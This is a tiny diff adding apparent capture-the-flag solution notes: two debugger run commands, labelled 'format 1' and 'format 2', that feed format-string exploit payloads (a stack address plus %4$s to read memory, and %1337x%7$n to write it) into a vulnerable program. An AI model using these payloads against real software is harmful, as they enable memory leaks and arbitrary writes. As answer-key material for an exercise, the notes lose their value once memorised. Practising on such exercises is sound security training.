@@ -1,0 +1,6 @@
+solves:
+format 1
+r <<< $(python -c "print '\xd0\xc8\xff\xff.%4\$s'")
+
+format 2
+r <<< $(python -c "print '\xdc\xc8\xff\xff%1337x%7\$n.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x'")
